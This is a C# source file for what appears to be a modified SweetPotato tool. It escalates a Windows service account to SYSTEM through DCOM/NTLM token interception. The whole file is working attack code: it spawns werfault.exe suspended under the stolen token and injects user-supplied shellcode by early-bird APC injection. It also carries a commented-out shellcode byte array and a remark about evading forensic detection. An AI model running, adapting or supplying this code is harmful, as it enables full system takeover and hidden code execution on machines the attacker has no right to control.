using Microsoft.Win32;
using Mono.Options;
using System;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using static SweetPotato.ImpersonationToken;

namespace SweetPotato {
    class Program {
        #region shellcode inject
        private static UInt32 MEM_COMMIT = 0x1000;
        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40; //I'm not using this #DFIR  ;-)
        private static UInt32 PAGE_READWRITE = 0x04;
        private static UInt32 PAGE_EXECUTE_READ = 0x20;

        [Flags]
        public enum ProcessAccessFlags : uint
        {
            All = 0x001F0FFF,
            Terminate = 0x00000001,
            CreateThread = 0x00000002,
            VirtualMemoryOperation = 0x00000008,
            VirtualMemoryRead = 0x00000010,
            VirtualMemoryWrite = 0x00000020,
            DuplicateHandle = 0x00000040,
            CreateProcess = 0x000000080,
            SetQuota = 0x00000100,
            SetInformation = 0x00000200,
            QueryInformation = 0x00000400,
            QueryLimitedInformation = 0x00001000,
            Synchronize = 0x00100000
        }

        [Flags]
        public enum ProcessCreationFlags : uint
        {
            ZERO_FLAG = 0x00000000,
            CREATE_BREAKAWAY_FROM_JOB = 0x01000000,
            CREATE_DEFAULT_ERROR_MODE = 0x04000000,
            CREATE_NEW_CONSOLE = 0x00000010,
            CREATE_NEW_PROCESS_GROUP = 0x00000200,
            CREATE_NO_WINDOW = 0x08000000,
            CREATE_PROTECTED_PROCESS = 0x00040000,
            CREATE_PRESERVE_CODE_AUTHZ_LEVEL = 0x02000000,
            CREATE_SEPARATE_WOW_VDM = 0x00001000,
            CREATE_SHARED_WOW_VDM = 0x00001000,
            CREATE_SUSPENDED = 0x00000004,
            CREATE_UNICODE_ENVIRONMENT = 0x00000400,
            DEBUG_ONLY_THIS_PROCESS = 0x00000002,
            DEBUG_PROCESS = 0x00000001,
            DETACHED_PROCESS = 0x00000008,
            EXTENDED_STARTUPINFO_PRESENT = 0x00080000,
            INHERIT_PARENT_AFFINITY = 0x00010000
        }
        /*
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }
        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public short wShowWindow;
            public short cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
        */
        [Flags]
        public enum ThreadAccess : int
        {
            TERMINATE = (0x0001),
            SUSPEND_RESUME = (0x0002),
            GET_CONTEXT = (0x0008),
            SET_CONTEXT = (0x0010),
            SET_INFORMATION = (0x0020),
            QUERY_INFORMATION = (0x0040),
            SET_THREAD_TOKEN = (0x0080),
            IMPERSONATE = (0x0100),
            DIRECT_IMPERSONATION = (0x0200)
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenThread(ThreadAccess dwDesiredAccess, bool bInheritHandle,
            int dwThreadId);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int nSize,
            out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        public static extern IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);

        [DllImport("kernel32")]
        public static extern IntPtr VirtualAlloc(UInt32 lpStartAddr,
             Int32 size, UInt32 flAllocationType, UInt32 flProtect);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress,
        Int32 dwSize, UInt32 flAllocationType, UInt32 flProtect);

        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(
         ProcessAccessFlags processAccess,
         bool bInheritHandle,
         int processId
        );

        [DllImport("kernel32.dll")]
        public static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, ProcessCreationFlags dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
        [DllImport("kernel32.dll")]
        public static extern uint ResumeThread(IntPtr hThread);
        [DllImport("kernel32.dll")]
        public static extern uint SuspendThread(IntPtr hThread);
        [DllImport("kernel32.dll")]
        public static extern bool VirtualProtectEx(IntPtr hProcess, IntPtr lpAddress,
        int dwSize, uint flNewProtect, out uint lpflOldProtect);
        #endregion
        
        static void PrintHelp(OptionSet options) {                
            options.WriteOptionDescriptions(Console.Out);
        }

        static bool IsBITSRequired() {

            if(Environment.OSVersion.Version.Major < 10) {
                return false;
            }

            RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion");
            var buildNumber = UInt32.Parse(registryKey.GetValue("ReleaseId").ToString());

            if(buildNumber <= 1809) {
                return false;
            }

            return true;        
        }

        static void Main(string[] args) {

            string clsId = "4991D34B-80A1-4291-83B6-3328366B9097";
            ushort port = 6666;
            string program = @"c:\Windows\System32\werfault.exe";
            string shellcode = null;
            ExecutionMethod executionMethod = ExecutionMethod.Auto;
            bool showHelp = false;
            bool isBITSRequired = false;

            Console.WriteLine(
                "[+] SweetPotato by @_EthicalChaos_,fixed by 2020/4/16\n");

            OptionSet option_set = new OptionSet()
                .Add<string>("c=|clsid=", "CLSID (default BITS: 4991D34B-80A1-4291-83B6-3328366B9097)", v => clsId = v)
                .Add<ExecutionMethod>("m=|method=", "Auto,User,Thread (default Auto)", v => executionMethod = v)
                .Add("p=|prog=", "Run a Process (werfault.exe)", v => program = v)
                .Add("s=|shellcode=", "Arguments for program (default null)", v => shellcode = v)
                .Add<ushort>("l=|listenPort=", "COM server listen port (default 6666)", v => port = v)
                .Add("h|help", "Display this help", v => showHelp = v != null);

            try {

                option_set.Parse(args);

                if (showHelp) {
                    PrintHelp(option_set);
                    return;
                }

            } catch (Exception e) {
                Console.WriteLine("[!] Failed to parse arguments: {0}", e.Message);
                PrintHelp(option_set);
                return;
            }

            try {

                if ( isBITSRequired = IsBITSRequired()) {
                    clsId = "4991D34B-80A1-4291-83B6-3328366B9097";
                    Console.WriteLine("[=] Your version of Windows fixes DCOM interception forcing BITS to perform WinRM intercept");
                    return;
                }

                bool hasImpersonate = EnablePrivilege(SecurityEntity.SE_IMPERSONATE_NAME);
                bool hasPrimary = EnablePrivilege(SecurityEntity.SE_ASSIGNPRIMARYTOKEN_NAME);
                bool hasIncreaseQuota = EnablePrivilege(SecurityEntity.SE_INCREASE_QUOTA_NAME);

                if(!hasImpersonate && !hasPrimary) {
                    Console.WriteLine("[!] Cannot perform NTLM interception, neccessary priveleges missing.  Are you running under a Service account?");
                    return;
                }

                if (executionMethod == ExecutionMethod.Auto) {
                    if (hasImpersonate) {
                        executionMethod = ExecutionMethod.Token;
                    } else if (hasPrimary) {
                        executionMethod = ExecutionMethod.User;
                    }
                }

                Console.WriteLine("[+] Attempting {0} with CLID {1} on port {2} using method {3} to launch {4}", 
                    isBITSRequired ? "NTLM Auth" : "DCOM NTLM interception", clsId, isBITSRequired ? 5985 :  port, executionMethod, program);

                PotatoAPI potatoAPI = new PotatoAPI(new Guid(clsId), port, isBITSRequired);

                if (!potatoAPI.TriggerDCOM()) {
                    Console.WriteLine("[!] No authenticated interception took place, exploit failed");
                    return;
                }

                Console.WriteLine("[+] Intercepted and authenticated successfully, launching program");

                IntPtr impersonatedPrimary;

                if (!DuplicateTokenEx(potatoAPI.Token, TOKEN_ALL_ACCESS, IntPtr.Zero,
                    SECURITY_IMPERSONATION_LEVEL.SecurityIdentification, TOKEN_TYPE.TokenPrimary, out impersonatedPrimary)) {
                    Console.WriteLine("[!] Failed to impersonate security context token");
                    return;
                }

                Thread systemThread = new Thread(() => {
                    SetThreadToken(IntPtr.Zero, potatoAPI.Token);
                    STARTUPINFO si = new STARTUPINFO();
                    PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
                    si.cb = Marshal.SizeOf(si);
                    si.lpDesktop = @"WinSta0\Default";

                    Console.WriteLine("[+] Created launch thread using impersonated user {0}", WindowsIdentity.GetCurrent(true).Name);

                    string finalArgs = null;
                    /*
                    if(shellcode != null)
                        finalArgs = string.Format("\"{0}\" {1}", program, args);
                    */
                    if (executionMethod == ExecutionMethod.Token) {
                        if (!CreateProcessWithTokenW(potatoAPI.Token, 0, program, finalArgs, CreationFlags.Suspended, IntPtr.Zero, null, ref si, out pi)) {
                            Console.WriteLine("[!] Failed to created impersonated process with token: {0}", Marshal.GetLastWin32Error());
                            return;
                        }
                    } else {
                        if (!CreateProcessAsUserW(impersonatedPrimary, program, finalArgs, IntPtr.Zero,
                            IntPtr.Zero, false, 0x00000004, IntPtr.Zero, @"C:\", ref si, out pi)) {
                            Console.WriteLine("[!] Failed to created impersonated process with user: {0} ", Marshal.GetLastWin32Error());
                            return;
                        }
                    }
                    byte[] b_shellcode = Convert.FromBase64String(shellcode);
                    //byte[] shellcode = new byte[112] {0x50,0x51,0x52,0x53,0x56,0x57,0x55,0x54,0x58,0x66,0x83,0xe4,0xf0,0x50,0x6a,0x60,0x5a,0x68,0x63,0x61,0x6c,0x63,0x54,0x59,0x48,0x29,0xd4,0x65,0x48,0x8b,0x32,0x48,0x8b,0x76,0x18,0x48,0x8b,0x76,0x10,0x48,0xad,0x48,0x8b,0x30,0x48,0x8b,0x7e,0x30,0x03,0x57,0x3c,0x8b,0x5c,0x17,0x28,0x8b,0x74,0x1f,0x20,0x48,0x01,0xfe,0x8b,0x54,0x1f,0x24,0x0f,0xb7,0x2c,0x17,0x8d,0x52,0x02,0xad,0x81,0x3c,0x07,0x57,0x69,0x6e,0x45,0x75,0xef,0x8b,0x74,0x1f,0x1c,0x48,0x01,0xfe,0x8b,0x34,0xae,0x48,0x01,0xf7,0x99,0xff,0xd7,0x48,0x83,0xc4,0x68,0x5c,0x5d,0x5f,0x5e,0x5b,0x5a,0x59,0x58,0xc3};
                    // Allocate memory within process and write shellcode
                    IntPtr resultPtr = VirtualAllocEx(pi.hProcess, IntPtr.Zero, b_shellcode.Length, MEM_COMMIT, PAGE_READWRITE);
                    IntPtr bytesWritten = IntPtr.Zero;
                    //Marshal.Copy(b_shellcode, 0, resultPtr, b_shellcode.Length);
                    bool resultBool = WriteProcessMemory(pi.hProcess, resultPtr, b_shellcode, b_shellcode.Length, out bytesWritten);

                    // Open thread
                    IntPtr sht = OpenThread(ThreadAccess.SET_CONTEXT, false, (int)pi.dwThreadId);
                    uint oldProtect = 0;

                    // Modify memory permissions on allocated shellcode
                    resultBool = VirtualProtectEx(pi.hProcess, resultPtr, b_shellcode.Length, PAGE_EXECUTE_READ, out oldProtect);

                    // Assign address of shellcode to the target thread apc queue
                    IntPtr ptr = QueueUserAPC(resultPtr, sht, IntPtr.Zero);

                    IntPtr ThreadHandle = pi.hThread;
                    ResumeThread(ThreadHandle);
                    Console.WriteLine("[+] Process created, enjoy!");
                });

                systemThread.Start();
                systemThread.Join();

            } catch (Exception e) {
                Console.WriteLine("[!] Failed to exploit COM: {0} ", e.Message);
                Console.WriteLine(e.StackTrace.ToString());
            }
        }
    }
}
